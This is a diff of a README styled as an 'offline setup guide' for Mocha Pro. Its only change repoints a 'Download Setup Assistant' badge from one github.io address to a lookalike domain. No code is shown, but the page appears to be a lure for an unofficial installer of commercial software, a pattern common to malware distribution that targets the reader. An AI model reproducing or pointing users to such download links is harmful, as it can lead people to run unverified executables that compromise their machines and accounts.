@@ -1,6 +1,6 @@
 # Mocha Pro — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://mocha-pro.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://mochapro-guide-download.github.io/.github/)
 
 ---
 
